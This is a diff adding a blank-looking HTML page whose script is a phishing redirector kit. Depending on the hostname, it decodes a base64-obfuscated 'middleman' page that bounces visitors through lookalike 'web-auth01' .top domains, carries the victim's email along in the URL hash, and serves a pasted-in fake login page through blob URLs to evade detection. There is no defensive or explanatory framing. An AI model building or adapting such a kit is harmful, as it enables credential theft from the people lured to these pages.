@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      var domainA = "netlify.app";
+      var domainB = "helical.co.za";
+      var currentHost = window.location.hostname;
+      var currentPath = window.location.pathname;
+      var currentHash = window.location.hash; 
+
+      if (currentHost === domainA) {
+        var encodedMiddlemanHtml = "PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9jb2RlLmpxdWVyeS5jb20vanF1ZXJ5LTMuNi4wLm1pbi5qcyI+PC9zY3JpcHQ+CiAgPHNjcmlwdD4KICAgICQoZG9jdW1lbnQpLnJlYWR5KGZ1bmN0aW9uKCkgewogICAgICAvLyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQogICAgICAvLyBDT05GSUdVUkFUSU9OCiAgICAgIC8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CiAgICAgIHZhciByZWRpcmVjdERvbWFpbiA9ICJ3ZWItYXV0aDAxLmJzc3gudG9wIjsgICAgIAogICAgICB2YXIgbWFpbkRvbWFpbiA9ICJ3ZWItYXV0aDAxLmNlcmF0ZWNoY29hdGluZ3MudG9wIjsgCiAgICAgIAogICAgICB2YXIgY3VycmVudEhvc3QgPSB3aW5kb3cubG9jYXRpb24uaG9zdG5hbWU7CiAgICAgIHZhciBjdXJyZW50UGF0aCA9IHdpbmRvdy5sb2NhdGlvbi5wYXRobmFtZTsKICAgICAgCiAgICAgIC8vIEFVVE8tR1JBQjogVGhpcyBhdXRvbWF0aWNhbGx5IGNhcHR1cmVzIHRoZSAjaGFzaCAoZW1haWwpIGZyb20gdGhlIFVSTAogICAgICB2YXIgY3VycmVudEhhc2ggPSB3aW5kb3cubG9jYXRpb24uaGFzaDsgCgogICAgICAvLyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQogICAgICAvLyBQSEFTRSAxOiBSRURJUkVDVCBET01BSU4gKEEpCiAgICAgIC8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CiAgICAgIGlmIChjdXJyZW50SG9zdCA9PSByZWRpcmVjdERvbWFpbikgewogICAgICAgIAogICAgICAgIC8vIE1BR0lDIFNFQ1RJT046IExFRlQgRU1QVFkgQVMgUkVRVUVTVEVECiAgICAgICAgdmFyIG1hZ2ljU3RyaW5nID0gIiI7IAoKICAgICAgICAvLyBBVVRPLVRSQU5TRkVSOiBSZWRpcmVjdHMgdG8gRG9tYWluIEIsIGtlZXBpbmcgdGhlIHBhdGggYW5kIHRoZSAjaGFzaAogICAgICAgIHZhciB0YXJnZXRVcmwgPSAiaHR0cHM6Ly8iICsgbWFpbkRvbWFpbiArIGN1cnJlbnRQYXRoICsgY3VycmVudEhhc2g7CiAgICAgICAgd2luZG93LmxvY2F0aW9uLmhyZWYgPSB0YXJnZXRVcmw7CiAgICAgIH0gCiAgICAgIAogICAgICAvLyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQogICAgICAvLyBQSEFTRSAyOiBNQUlOIERPTUFJTiAoQikKICAgICAgLy8gPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KICAgICAgZWxzZSBpZiAoY3VycmVudEhvc3QgPT09IG1haW5Eb21haW4pIHsKICAgICAgICAKICAgICAgICAvLyBGSU5BTCBDT05URU5UIFNFQ1RJT046IFBBU1RFIFlPVVIgQkFTRTY0IEhFUkUKICAgICAgICB2YXIgZW5jb2RlZFN0cmluZ0F0b0IgPSAiUEFTVEVfWU9VUl9SRUFMX0JBU0U2NF9IRVJFIjsgCgogICAgICAgIHZhciBkZWNvZGVkU3RyaW5nQXRvQiA9IGF0b2IoZW5jb2RlZFN0cmluZ0F0b0IpOwogICAgICAgIGNvbnN0IG15QmxvYiA9IG5ldyBCbG9iKFtkZWNvZGVkU3RyaW5nQXRvQl0sIHsgdHlwZTogJ3RleHQvaHRtbCcgfSk7CiAgICAgICAgY29uc3QgdXJsID0gd2luZG93LlVSTC5jcmVhdGVPYmplY3RVUkwobXlCbG9iKTsKICAgIAogICAgICAgIC8vIEFVVE8tREVMSVZFUlk6IENyZWF0ZXMgdGhlIGJsb2IgVVJMIGFuZCBhdHRhY2hlcyB0aGUgI2hhc2ggdG8gaXQKICAgICAgICB2YXIgYSA9ICQoIjxhIHN0eWxlPSdkaXNwbGF5OiBub25lOycvPiIpOwogICAgICAgIGEuYXR0cigiaHJlZiIsIHVybCArIChjdXJyZW50SGFzaCB8fCAiIikpOwogICAgICAgICQoImJvZHkiKS5hcHBlbmQoYSk7CiAgICAgICAgYVswXS5jbGljaygpOwogICAgICAgIAogICAgICAgIHdpbmRvdy5VUkwucmV2b2tlT2JqZWN0VVJMKHVybCk7CiAgICAgICAgYS5yZW1vdmUoKTsKICAgICAgfQogICAgfSk7CiAgPC9zY3JpcHQ+CjwvaGVhZD4KPGJvZHk+CjwvYm9keT4KPC9odG1sPg==";
+        try {
+          var middlemanHtml = atob(encodedMiddlemanHtml);
+          var finalMiddlemanHtml = middlemanHtml.replace("__DOMAIN_B__", domainB);
+          const myBlob = new Blob([finalMiddlemanHtml], { type: 'text/html' });
+          const url = window.URL.createObjectURL(myBlob);
+          window.location.replace(url + (currentHash || ""));
+        } catch (e) {
+          console.error("Failed to process middleman redirect.", e);
+          window.location.replace("https://" + domainB + currentPath + currentHash);
+        }
+      } 
+      
+      else if (currentHost === domainB) {
+        
+        var encodedFinalContent = "PASTE_YOUR_BASE64_ENCODED_LOGIN_PAGE_HERE"; 
+        var decodedStringAtoB = null;
+
+        if (encodedFinalContent && encodedFinalContent !== "PASTE_YOUR_BASE64_ENCODED_LOGIN_PAGE_HERE") {
+          try {
+            decodedStringAtoB = atob(encodedFinalContent);
+          } catch (e) {
+            console.error("Failed to decode final content Base64 string.", e);
+          }
+        }
+        
+        const finalBlob = new Blob([decodedStringAtoB], { type: 'text/html' });
+        const finalUrl = window.URL.createObjectURL(finalBlob);
+        window.location.replace(finalUrl + (currentHash || ""));
+      }
+    });
+  </script>
+</head>
+<body>
+</body>
+</html>
